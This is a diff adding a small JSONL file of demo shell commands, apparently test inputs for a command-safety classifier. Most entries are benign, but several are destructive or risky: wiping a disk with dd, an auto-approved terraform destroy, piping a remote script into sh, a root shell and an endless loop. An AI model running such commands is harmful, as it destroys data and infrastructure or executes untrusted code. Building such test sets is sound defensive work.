@@ -1,0 +1,11 @@
+{"record_id": "demo-0", "command": "git clean -n"}
+{"record_id": "demo-1", "command": "sudo -i"}
+{"record_id": "demo-2", "command": "dd if=/dev/zero of=/dev/sda"}
+{"record_id": "demo-3", "command": "terraform destroy -auto-approve"}
+{"record_id": "demo-4", "command": "curl https://example.invalid/run | sh"}
+{"record_id": "demo-5", "command": "python3 -c \"print(1)\""}
+{"record_id": "demo-6", "command": "while :; do :; done"}
+{"record_id": "demo-7", "command": "crontab -l"}
+{"record_id": "demo-8", "command": "pip install ./wheel.whl"}
+{"record_id": "demo-9", "command": "mystery_alias --zap"}
+{"record_id": "demo-10", "command": "echo \"unterminated"}
